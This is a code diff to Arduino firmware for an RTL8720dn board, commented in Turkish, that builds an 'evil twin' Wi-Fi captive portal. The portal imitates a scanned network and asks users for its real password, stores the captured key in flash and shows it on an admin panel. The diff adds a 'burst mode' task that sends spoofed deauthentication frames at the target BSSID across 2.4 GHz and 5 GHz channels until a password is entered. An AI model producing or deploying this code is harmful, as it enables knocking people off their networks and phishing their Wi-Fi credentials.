@@ -1,7 +1,7 @@
 // AP+STA Captive Portal — RTL8720dn (AmebaD)
-// NİHAİ SÜRÜM: Orijinal Ağ Mantığı + CSS Bozulma Koruması + Panel + Çift Çekirdekli Otomatik Reboot (sys_reset)
+// NİHAİ SÜRÜM: "Burst Modu" Maksimum Hızlandırılmış 5GHz + 2.4GHz Deauth
 
-#include "sys_api.h"  // YENİ EKLENEN KÜTÜPHANE: Realtek Çift Çekirdek Reset İşlemleri İçin
+#include "sys_api.h"  
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
@@ -32,6 +32,7 @@
 #define ENC_TYPE_CCMP  4
 #endif
 
+// LOW-LEVEL REALTEK KÜTÜPHANELERİ
 extern "C" {
   extern struct netif xnetif[];
   void dhcps_init(struct netif *pnetif);
@@ -40,10 +41,12 @@ extern "C" {
   int  wext_set_mode(const char *ifname, int mode);
   int  wifi_disconnect(void);
   void LwIP_Init(void);
+  int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
+  int  wifi_set_channel(int channel); // Frekans Zıplaması İçin
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// ─── İÇE GÖMÜLÜ DNS SERVER KÜTÜPHANESİ ───────────────────────────────────────
+// ─── İÇE GÖMÜLÜ DNS SERVER ───────────────────────────────────────────────────
 // ─────────────────────────────────────────────────────────────────────────────
 
 #ifndef PACK_STRUCT_FIELD
@@ -102,23 +105,17 @@ struct DNSQuestion {
 class DNSServer {
 public:
     DNSServer() {
-        _resolvedIP[0] = 192;
-        _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
+        _resolvedIP[0] = 192; _resolvedIP[1] = 168; _resolvedIP[2] = 4; _resolvedIP[3] = 1;
         _dns_server_pcb = NULL;
     }
-    
     void setResolvedIP(uint8_t ip0, uint8_t ip1, uint8_t ip2, uint8_t ip3) {
-        _resolvedIP[0] = ip0;
-        _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
+        _resolvedIP[0] = ip0; _resolvedIP[1] = ip1; _resolvedIP[2] = ip2; _resolvedIP[3] = ip3;
     }
-    
     bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
         return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
     }
-    
     void begin();
     void stop();
-
     uint8_t _resolvedIP[4];
 private:
     struct udp_pcb *_dns_server_pcb;
@@ -131,16 +128,13 @@ void DNSServer::begin() {
     dnsServerInstance = this;
     struct udp_pcb *pcb;
     for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
-        if (pcb->local_port == DNS_SERVER_PORT) {
-            udp_remove(pcb);
-        }
+        if (pcb->local_port == DNS_SERVER_PORT) udp_remove(pcb);
     }
     for (int _retry = 0; _retry < 3 && !_dns_server_pcb; _retry++) {
         _dns_server_pcb = udp_new();
         if (!_dns_server_pcb) delay(300);
     }
     if (!_dns_server_pcb) return;
-    
     udp_bind(_dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
     udp_recv(_dns_server_pcb, (udp_recv_fn)packetHandler, NULL);
 }
@@ -170,8 +164,7 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
         uint16_t offset = DNS_HEADER_SIZE;
         uint16_t nameLength = 0;
         while (offset < udp_packet_buffer->len && ((uint8_t*)udp_packet_buffer->payload)[offset] != 0) {
-            nameLength++;
-            offset++;
+            nameLength++; offset++;
         }
         if (offset >= udp_packet_buffer->len - 4) { pbuf_free(udp_packet_buffer); return; }
         
@@ -222,7 +215,7 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// ─── ANA PORTAL KODLARI BAŞLIYOR ─────────────────────────────────────────────
+// ─── ANA PORTAL KODLARI ──────────────────────────────────────────────────────
 // ─────────────────────────────────────────────────────────────────────────────
 
 #define DHCP_START   1
@@ -239,10 +232,7 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 #define MAX_SSID_LEN     64
 #define MAX_PASS_LEN     64
 #define FLASH_BUF_SIZE   256
-
-// +++ GÜVENLİ FLASH HAFIZA ADRESİ (Cihazın yazılımının bozulmasını önler) +++
 #define FLASH_OFFSET     0x00100000 
-// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 struct SavedCredentials {
   uint8_t magic;
@@ -252,6 +242,7 @@ struct SavedCredentials {
 
 struct NetworkInfo {
   String  ssid;
+  uint8_t bssid[6]; 
   int32_t rssi;
   uint8_t enc;
   int32_t channel; 
@@ -269,8 +260,11 @@ bool pending_ap_switch = false;
 unsigned long revert_time = 0; 
 
 char target_ssid[MAX_SSID_LEN] = {0};
+uint8_t target_bssid[6] = {0}; 
 int32_t target_channel = 6;
 uint8_t target_enc = ENC_TYPE_CCMP;
+
+volatile bool deauth_active = false; 
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -313,7 +307,6 @@ void loadCredentials() {
   }
 }
 
-// +++ GÜVENLİ VE KESİN HAFIZA KAYIT SİSTEMİ +++
 void saveCredentials(const char *ssid, const char *pass) {
   FlashMemory.read(); 
   SavedCredentials creds;
@@ -324,7 +317,7 @@ void saveCredentials(const char *ssid, const char *pass) {
   strncpy(creds.pass, pass, MAX_PASS_LEN - 1);
   memcpy(FlashMemory.buf, &creds, sizeof(creds));
   FlashMemory.update();
-  delay(1000); // Yazılımın bozulmaması için çipe kaydı fiziksel olarak bitirme süresi
+  delay(1000); 
 }
 
 rtw_security_t mapSecurity(uint8_t enc) {
@@ -349,6 +342,9 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     net.rssi = record->signal_strength;
     net.channel = record->channel; 
     
+    // Hedefin MAC Adresini Oku
+    memcpy(net.bssid, record->BSSID.octet, 6);
+    
     if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
     else if (record->security == RTW_SECURITY_WEP_PSK) net.enc = ENC_TYPE_WEP;
     else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || record->security == RTW_SECURITY_WPA_AES_PSK || record->security == RTW_SECURITY_WPA_MIXED_PSK) net.enc = ENC_TYPE_TKIP;
@@ -363,6 +359,7 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
             existing.rssi = net.rssi;
             existing.channel = net.channel;
             existing.enc = net.enc;
+            memcpy(existing.bssid, net.bssid, 6); 
           }
           break;
         }
@@ -400,7 +397,7 @@ void startScan() {
   xTaskCreate(scanNetworkTask, "scan", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
 }
 
-// ─── BAĞLANTI GÖREVİ (DONMA KORUMALI) ────────────────────────────────────────
+// ─── BAĞLANTI GÖREVİ ─────────────────────────────────────────────────────────
 void wifiConnectTask(void *param) {
   (void)param;
   bool is_open = (mapSecurity(pending_enc) == RTW_SECURITY_OPEN);
@@ -424,7 +421,6 @@ void wifiConnectTask(void *param) {
   }
 
   if (ret == RTW_SUCCESS) {
-    // IP adresini almasını beklemiyoruz, donmayı engelliyoruz!
     vTaskDelay(pdMS_TO_TICKS(500)); 
     conn_status = CS_DONE_OK;
   } else {
@@ -438,6 +434,77 @@ void startConnectTask() {
   conn_status = CS_RUNNING;
   xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
+
+// ─── BURST MODU: MAKSİMUM HIZLANDIRILMIŞ 5GHz + 2.4GHz GÖREVİ ────────────────
+void deauthTask(void *param) {
+  (void)param;
+  
+  uint8_t deauth_frame[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Doldurulacak)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Doldurulacak)
+    0x00, 0x00,
+    0x07, 0x00 // Reason Code 7
+  };
+
+  // Tüm 5GHz kanallarını tek seferde vurmak için liste
+  int common_5g_channels[] = {36, 40, 44, 48, 149};
+
+  Serial.println("\n[Deauth] BURST MODU AKTİF! 5GHz'e isik hizinda kursun yagiyor...");
+
+  while (deauth_active) {
+    // === ADIM 1: WEB SUNUCUSUNU YAŞATMAK İÇİN 2.4GHz'e DÖN VE BEKLE ===
+    wifi_set_channel(target_channel);
+    
+    // 2.4GHz Fuzzing Atışı
+    for (int offset = -2; offset <= 2; offset++) {
+        uint8_t temp_bssid[6];
+        memcpy(temp_bssid, target_bssid, 6);
+        temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+
+        memcpy(&deauth_frame[10], temp_bssid, 6);
+        memcpy(&deauth_frame[16], temp_bssid, 6);
+
+        // Hızlı çift atış
+        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+        vTaskDelay(pdMS_TO_TICKS(1)); // Minimum çip koruma molası
+    }
+    
+    // DİKKAT: Cihazın Captive Portal sayfasını (Sahte Ağı) telefonda ayakta tutabilmesi 
+    // ve DNS isteklerine cevap verebilmesi için bu kısa dinlenme (150ms) ŞARTTIR.
+    vTaskDelay(pdMS_TO_TICKS(150)); 
+
+    // === ADIM 2: BÜTÜN 5GHz KANALLARINA HIZLI (BURST) BASKIN ===
+    // Bekleme süresi koymadan tüm 5GHz kanallarına saniyeden kısa sürede girip çıkacak.
+    for(int c=0; c < 5; c++) {
+        wifi_set_channel(common_5g_channels[c]);
+        
+        for (int offset = -2; offset <= 2; offset++) {
+            uint8_t temp_bssid[6];
+            memcpy(temp_bssid, target_bssid, 6);
+            temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+
+            memcpy(&deauth_frame[10], temp_bssid, 6);
+            memcpy(&deauth_frame[16], temp_bssid, 6);
+
+            // Her 5GHz varyasyonuna anlık 3 mermi (vTaskDelay olmadan, ardışık!)
+            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+            
+            // Watchdog Timer (WDT) çipi sıfırlamasın diye 1 milisaniye koruma
+            vTaskDelay(pdMS_TO_TICKS(1)); 
+        }
+    }
+    // Tur biter bitmez döngü başa döner ve anında 2.4GHz'e geri zıplar.
+  }
+  
+  Serial.println("[Deauth] Saldiri Basariyla Sonlandirildi.");
+  vTaskDelete(NULL);
+}
+// ─────────────────────────────────────────────────────────────────────────────
 
 // ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
 String rssiBar(int32_t rssi) {
@@ -463,6 +530,7 @@ String parsePostParam(const String &body, const String &key) {
   return urlDecode(body.substring(start, end));
 }
 
+// CSS VERİSİ
 static const char CSS_STR[] PROGMEM =
   "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
   ".card{background:#16213e;border-radius:14px;padding:24px;width:100%;max-width:500px;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
@@ -476,14 +544,11 @@ static const char CSS_STR[] PROGMEM =
   ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #5dade2;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:6px}@keyframes spin{to{transform:rotate(360deg)}}"
   ".footer{text-align:center;font-size:.75rem;color:#555;margin-top:8px}</style>";
 
-// CSS Verisini ufak paketler halinde yazdıran fonksiyon (Tasarım bozulmasını engeller)
 void sendChunkedCSS(WiFiClient &client) {
   const char *p = CSS_STR;
   while (*p) {
     int len = 0;
-    while (p[len] != '\0' && len < 200) {
-      len++;
-    }
+    while (p[len] != '\0' && len < 200) len++;
     client.write((const uint8_t *)p, len);
     client.flush();
     delay(5);
@@ -496,9 +561,7 @@ void sendStartPage(WiFiClient &client) {
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
   client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Guvenli Kurulum - Ag Secimi</title>");
-  
   sendChunkedCSS(client);
-  
   client.print("</head><body><div class='card'><h1>&#128274; Guvenli Kurulum</h1><p class='sub'>Lutfen hedef aginizi listeden secin</p>");
 
   if (scan_status == SCAN_RUNNING) {
@@ -506,10 +569,7 @@ void sendStartPage(WiFiClient &client) {
   }
 
   if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
-  
-  client.print("<h2>&#128225; Kullanilabilir Aglar ("); 
-  client.print(networks.size()); 
-  client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
+  client.print("<h2>&#128225; Kullanilabilir Aglar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
 
   for (int i = 0; i < (int)networks.size(); i++) {
     String safe = networks[i].ssid;
@@ -520,7 +580,6 @@ void sendStartPage(WiFiClient &client) {
     client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
     client.print("<div class='net-meta'>"); client.print(rssiBar(networks[i].rssi)); client.print(" &nbsp;|&nbsp; Kanal: "); client.print(networks[i].channel); client.print("</div></div></li>");
   }
-  
   if (networks.empty() && scan_status != SCAN_RUNNING) {
       client.print("<li style='padding:16px;text-align:center;color:#aaa;'>Ag bulunamadi.</li>");
   }
@@ -529,7 +588,6 @@ void sendStartPage(WiFiClient &client) {
   client.print("</ul><button type='submit'>Kurulumu Baslat</button></form>");
   client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue'>&#8635; Yeniden Ara</button></form>");
 
-  // Yakalanan Şifreyi Gösterme ve Silme Paneli
   if (strlen(saved_ssid) > 0) {
     client.print("<div style='background:#0a2040;border:1px solid #3498db;border-radius:8px;padding:12px;margin-top:16px;'>");
     client.print("<h3 style='font-size:0.9rem;color:#5dade2;margin-bottom:8px;text-align:center;'>&#128190; Yakalanan Ag Sifresi</h3>");
@@ -542,7 +600,6 @@ void sendStartPage(WiFiClient &client) {
     client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;'>Sil</button>");
     client.print("</form></div></div>");
   }
-
   client.print("<div class='footer'>Mevcut Yonetim Agi: X</div></div></body></html>");
 }
 
@@ -561,9 +618,8 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
   client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>WiFi Sifre Onayi</title>");
-  
   sendChunkedCSS(client);
-  
+
   client.print("</head><body><div class='card'><h1>&#128273; WiFi Sifre Dogrulamasi</h1>");
   client.print("<p class='sub'>Lutfen taklit edilen bu agin gercek anahtarini girin</p>");
 
@@ -577,6 +633,7 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("<div class='conn-status'>Secilen Baglanti Agi: <b>"); client.print(target_ssid);
   client.print("</b><br><small style='color:#aaa'>Frekans Eslemesi (Kanal): "); client.print(target_channel); client.print("</small></div>");
   
+  // SADE ŞİFRE GİRİŞ FORMU
   client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>Sifre Giriniz</label>");
   client.print("<input type='password' id='pass' name='pass' placeholder='Sifreyi buraya yazin...' autocomplete='off' required>");
   client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Goster/Gizle</div></div>");
@@ -670,6 +727,7 @@ void handleClient(WiFiClient &client) {
         if (net.ssid == sel_ssid) {
           target_channel = net.channel;
           target_enc = net.enc;
+          memcpy(target_bssid, net.bssid, 6);
           break;
         }
       }
@@ -709,11 +767,10 @@ void handleClient(WiFiClient &client) {
 // ─── Setup ───────────────────────────────────────────────────────────────────
 void setup() {
   Serial.begin(115200); delay(500);
-  Serial.println("\n[Boot] Cihaz Aciliyor... Flash Korumali Tam Surum Aktif!");
+  Serial.println("\n[Boot] Cihaz Aciliyor... BURST (Maksimum Hizli) Deauth Aktif!");
 
   networks_mutex = xSemaphoreCreateMutex();
   
-  // +++ GÜVENLİ FLASH ADRESİNDE BAŞLATILIYOR +++
   FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
   loadCredentials();
   
@@ -769,6 +826,9 @@ void loop() {
     dnsServer.begin();
 
     Serial.println("[Switch] Islem Tamam! Baglanti Kilidi Cozuldu ve DNS Yonlendirmesi Aktif.");
+    
+    deauth_active = true;
+    xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
 
   if (scan_status == SCAN_DONE) scan_status = SCAN_IDLE;
@@ -778,8 +838,9 @@ void loop() {
     strncpy(saved_ssid, pending_ssid, MAX_SSID_LEN - 1);
     strncpy(saved_pass, pending_pass, MAX_PASS_LEN - 1);
     
-    // Güvenli hafızaya kayıt
     saveCredentials(saved_ssid, saved_pass);
+    
+    deauth_active = false;
     
     conn_result = "ok"; 
     conn_status = CS_IDLE;
@@ -790,13 +851,12 @@ void loop() {
     sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
   }
 
-  // SİSTEMİ TAMAMEN SIFIRLAYARAK X AĞINA TEMİZ DÖNÜŞ YAPAR (REALTEK KOMUTU İLE)
   if (revert_time > 0 && millis() > revert_time) {
     revert_time = 0;
     Serial.println("\n[Revert] Sifre dogrulandi, X agina donmek icin yeniden baslatiliyor...");
-    Serial.flush(); // Serial mesajının tamamen yazdırılmasını bekle
-    delay(200);     // Donanıma nefes alma payı
-    sys_reset();    // REALTEK RESMİ RESET KOMUTU
+    Serial.flush(); 
+    delay(200);     
+    sys_reset();    
   }
 
   if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && !ap_switched && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
